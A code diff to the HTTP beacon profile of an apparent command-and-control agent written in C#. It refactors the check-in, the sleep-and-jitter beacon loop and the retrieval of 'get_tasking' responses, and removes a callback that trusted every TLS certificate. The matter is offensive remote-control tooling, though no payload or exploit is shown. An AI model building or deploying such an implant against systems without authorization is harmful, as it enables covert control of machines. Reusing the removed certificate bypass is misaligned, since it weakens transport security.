@@ -2,7 +2,7 @@ using Agent.Interfaces;
 using Agent.Models;
 using System.Net;
 using Agent.Utilities;
-using System.Net.Security;
+
 using System.Text.Json;
 
 namespace Agent.Profiles
@@ -54,12 +54,6 @@ namespace Agent.Profiles
             this.proxyUser = opts.ProxyUser;
 
 
-            //Might need to make this configurable
-            ServicePointManager.ServerCertificateValidationCallback =
-                   new RemoteCertificateValidationCallback(
-                        delegate
-                        { return true; }
-                    );
 
             if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
             {
@@ -107,7 +101,17 @@ namespace Agent.Profiles
 
                 if (!string.IsNullOrEmpty(res))
                 {
-                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                    try
+                    {
+                        CheckinResponse? response = JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                        if (CheckinResponseValidation.IsSuccessful(response))
+                        {
+                            return response!;
+                        }
+                    }
+                    catch (JsonException)
+                    {
+                    }
                 }
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
@@ -121,31 +125,20 @@ namespace Agent.Profiles
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 try
                 {
-                    string responseString = await this.Send(messageManager.GetAgentResponseString());
-                    if (String.IsNullOrEmpty(responseString))
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
-
-                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    if (gtr == null)
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
-
-                    this.currentAttempt = 0;
-
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                    this.SetTaskingReceived(null, tra);
+                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
+                }
+                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
+                {
+                    break;
+                }
+                try
+                {
+                    bool delivered = await DeliverBeaconOnce();
+                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                 }
                 catch (Exception e)
                 {
@@ -158,12 +151,49 @@ namespace Agent.Profiles
                 }
             }
         }
-        internal async Task<string> Send(string json)
+
+        private async Task<bool> DeliverBeaconOnce()
         {
+            GetTaskingResponse? tasking = null;
+            await messageManager.DeliverAsync(
+                this.Send,
+                response => TryParseTasking(response, out tasking));
+            if (tasking is null)
+            {
+                return false;
+            }
+
+            this.SetTaskingReceived?.Invoke(null, new TaskingReceivedArgs(tasking));
+            return true;
+        }
+
+        private static bool TryParseTasking(string response, out GetTaskingResponse? tasking)
+        {
+            tasking = null;
+            if (string.IsNullOrEmpty(response))
+            {
+                return false;
+            }
+
             try
             {
+                tasking = JsonSerializer.Deserialize(response, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                if (tasking?.action != "get_tasking")
+                {
+                    tasking = null;
+                    return false;
+                }
+                return true;
+            }
+            catch (JsonException)
+            {
+                return false;
+            }
+        }
 
-                //This will encrypted if AES is selected or just Base64 encode if None is referenced.
+        internal async Task<string> Send(string json)
+        {
+            //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                 json = this.crypt.Encrypt(json);
 
                 HttpResponseMessage response;
@@ -182,15 +212,11 @@ namespace Agent.Profiles
                     response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                 }
 
+                response.EnsureSuccessStatusCode();
                 string strRes = await response.Content.ReadAsStringAsync();
 
                 //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
                 return this.crypt.Decrypt(strRes);
-            }
-            catch
-            {
-                return String.Empty;
-            }
         }
 
         public bool StopBeacon()
